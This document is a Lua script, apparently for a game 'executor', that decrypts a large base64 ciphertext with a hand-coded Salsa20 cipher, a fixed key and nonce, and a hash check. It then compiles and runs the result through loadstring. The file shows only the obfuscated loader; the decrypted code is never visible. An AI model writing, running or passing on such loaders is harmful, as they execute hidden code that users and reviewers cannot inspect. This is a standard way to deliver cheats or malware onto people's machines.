local _fju = pcall
local _tuz = nil
local _pke = ""

local function _safeRun()
  local _b0 = "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"
  local _b1 = "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"
  local _b2 = "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"
  local _b3 = "jK7XjQ604ae3Aok2zMjJSfk1TzSO9qisTeXjlPmqw4NVKpCfiRrefqDu5Fb//Fb2yWIs5432RcYblJZGsWxnTXCeaxC2lp4wkIF8ZxFAf2t8SpvwcvhtDjQfxunRxd76QAaReb0lu8jdPlkEtLuprvL52guAJr1U8g70+LQVYNe9kyTZoHfFkPnk3NBTFbxdAGrP+9C1G9ok/4gSaVSwBMffofsz6ENnGah9EgMXaXLDck49SsdkRk/afOt9di8gBXyHCuBWwtUof34TKUtPAXhL9tlL+pPPfhrALLlAxADuIJAwgyXPtb6L7lFcYWkYORJRurFWHGwiWssvo1nQc7yYMN1Gls95w383Wee8oazbAvY0JQxIeiBQt0LKPzax0n54NVQICDvB83KjMjX6N7ziX5YbI1hFDc/IPM8KPhMPuXP6thiaHdqaA+qr2vhm4Ba4495n5kS1AwytbyCw29YASn29i5MLUGC4rTLNudngxtZFwq4KLOs4f3t9hrrdfANVQ0tAs8HkWmh2I49NKGtUzSRJ9Tsm3GP4kvSLxjbRXHMcwK9SWBfu+kjpj0iDfY6RKfvJLsJWVtRGYLOEB3g+PgQFzPal"

  local _bitLib = bit32 or bit
  local _bXor, _bRotl

  if _bitLib and _bitLib.bxor and _bitLib.lrotate then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n) return _bitLib.lrotate(math.floor(tonumber(x) or 0) % 4294967296, math.floor(tonumber(n) or 0) % 32) end
  elseif _bitLib and _bitLib.bxor and _bitLib.lshift and _bitLib.rshift then
    _bXor = function(a, b) return _bitLib.bxor(math.floor(tonumber(a) or 0) % 4294967296, math.floor(tonumber(b) or 0) % 4294967296) end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      return (_bitLib.lshift(x, n) + _bitLib.rshift(x, 32 - n)) % 4294967296
    end
  else
    _bXor = function(a, b)
      a = math.floor(tonumber(a) or 0) % 4294967296
      b = math.floor(tonumber(b) or 0) % 4294967296
      local r, m = 0, 1
      while a > 0 or b > 0 do
        if (a % 2) ~= (b % 2) then r = r + m end
        a = math.floor(a / 2); b = math.floor(b / 2); m = m * 2
      end
      return r
    end
    _bRotl = function(x, n)
      x = math.floor(tonumber(x) or 0) % 4294967296
      n = math.floor(tonumber(n) or 0) % 32
      if n == 0 then return x end
      local p1 = math.floor(x / 2^(32 - n))
      local p2 = (x * 2^n) % 4294967296
      return (p1 + p2) % 4294967296
    end
  end

  local function _chr(v)
    return string.char(math.floor(tonumber(v) or 0) % 256)
  end

  local function _hex2bin(h)
    local o = {}
    for i = 1, #h, 2 do
      local v = tonumber(h:sub(i, i + 1), 16)
      if v then o[#o + 1] = _chr(v) end
    end
    return table.concat(o)
  end

  local function _b64d(s)
    local tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local o = {}
    for i = 1, #s, 4 do
      local a = (tbl:find(s:sub(i, i), 1, true) or 1) - 1
      local b = (tbl:find(s:sub(i + 1, i + 1), 1, true) or 1) - 1
      local c3 = s:sub(i + 2, i + 2)
      local c4 = s:sub(i + 3, i + 3)
      local c = c3 == "=" and 0 or (tbl:find(c3, 1, true) or 1) - 1
      local d = c4 == "=" and 0 or (tbl:find(c4, 1, true) or 1) - 1
      o[#o + 1] = _chr(a * 4 + math.floor(b / 16))
      if c3 ~= "=" then o[#o + 1] = _chr((b % 16) * 16 + math.floor(c / 4)) end
      if c4 ~= "=" then o[#o + 1] = _chr((c % 4) * 64 + d) end
    end
    return table.concat(o)
  end

  local _kgv = _hex2bin("eb477e481f979bbf510233d89ed1fb520e2f6c88d59ab35ef36e59dfc6b1e15d")
  local _edw = _hex2bin("3cff22cf056312d7")

  if #_kgv ~= 32 or #_edw ~= 8 then
    _tuz = "invalid key/nonce"
    return
  end

  local SIG = {0x61707865, 0x3320646e, 0x79622d32, 0x6b206574}

  local function _block(k32, n32, ctr_lo, ctr_hi)
    local s = {
      SIG[1], k32[1], k32[2], k32[3], k32[4], SIG[2], n32[1], n32[2],
      ctr_lo, ctr_hi, SIG[3], k32[5], k32[6], k32[7], k32[8], SIG[4]
    }
    local o = {}
    for i = 1, 16 do o[i] = s[i] end

    local function qr(a, b, c2, d)
      s[b] = _bXor(s[b], _bRotl((s[a] + s[d]) % 4294967296, 7))
      s[c2] = _bXor(s[c2], _bRotl((s[b] + s[a]) % 4294967296, 9))
      s[d] = _bXor(s[d], _bRotl((s[c2] + s[b]) % 4294967296, 13))
      s[a] = _bXor(s[a], _bRotl((s[d] + s[c2]) % 4294967296, 18))
    end

    for _ = 1, 10 do
      qr(1, 5, 9, 13); qr(6, 10, 14, 2); qr(11, 15, 3, 7); qr(16, 4, 8, 12)
      qr(1, 2, 3, 4); qr(6, 7, 8, 5); qr(11, 12, 9, 10); qr(16, 13, 14, 15)
    end

    local out = {}
    for i = 1, 16 do
      local v = (s[i] + o[i]) % 4294967296
      v = math.floor(tonumber(v) or 0)
      out[#out + 1] = _chr(v % 256)
      out[#out + 1] = _chr(math.floor(v / 256) % 256)
      out[#out + 1] = _chr(math.floor(v / 65536) % 256)
      out[#out + 1] = _chr(math.floor(v / 16777216) % 256)
    end
    return table.concat(out)
  end

  local k32, n32 = {}, {}
  for i = 1, 8 do
    local p = (i - 1) * 4 + 1
    k32[i] = string.byte(_kgv, p)
           + string.byte(_kgv, p + 1) * 256
           + string.byte(_kgv, p + 2) * 65536
           + string.byte(_kgv, p + 3) * 16777216
  end
  for i = 1, 2 do
    local p = (i - 1) * 4 + 1
    n32[i] = string.byte(_edw, p)
           + string.byte(_edw, p + 1) * 256
           + string.byte(_edw, p + 2) * 65536
           + string.byte(_edw, p + 3) * 16777216
  end

  local raw = _b64d(table.concat({_b0, _b1, _b2, _b3}))
  local dec = {}
  local counter = 0
  local acc = {}

  for pos = 1, #raw, 64 do
    local lo = counter % 4294967296
    local hi = math.floor(counter / 4294967296) % 4294967296
    local block = _block(k32, n32, lo, hi)
    counter = counter + 1
    for i = 1, 64 do
      local idx = pos + i - 1
      if idx > #raw then break end
      acc[#acc + 1] = _chr(_bXor(string.byte(raw, idx), string.byte(block, i)))
    end
    if #acc >= 4096 then
      dec[#dec + 1] = table.concat(acc)
      acc = {}
    end
  end
  if #acc > 0 then dec[#dec + 1] = table.concat(acc) end

  _pke = table.concat(dec)

  local h = 0
  for i = 1, #_pke do
    h = (h * 16777619 + string.byte(_pke, i)) % 4294967296
  end
  if h ~= 3340877034 then
    _tuz = "hash mismatch"
    return
  end

  local _load = loadstring or load
  if not _load and getfenv then
    local ok, f = pcall(getfenv)
    if ok and type(f) == "table" then _load = f.loadstring or f.load end
  end
  if not _load then
    _tuz = "no loadstring available in this executor"
    return
  end

  local _okTest, _compiledTest = _fju(_load, "return 2+2")
  if not _okTest or not _compiledTest then
    _tuz = "loadstring check failed"
    return
  end
  local _okRun, _res = _fju(_compiledTest)
  if not _okRun or _res ~= 4 then
    _tuz = "loadstring execution check failed"
    return
  end

  local _okComp, _fn = _fju(_load, _pke)
  if not _okComp or not _fn then
    _tuz = "compilation failed"
    return
  end

  local _okExec, _execErr = _fju(_fn)
  if not _okExec then
    _tuz = "execution failed: " .. tostring(_execErr)
  end
end

local _okGlobal, _globalErr = _fju(_safeRun)
if not _okGlobal then
  warn("[obf] wrapper crashed: " .. tostring(_globalErr))
elseif _tuz then
  warn("[obf] " .. tostring(_tuz))
end
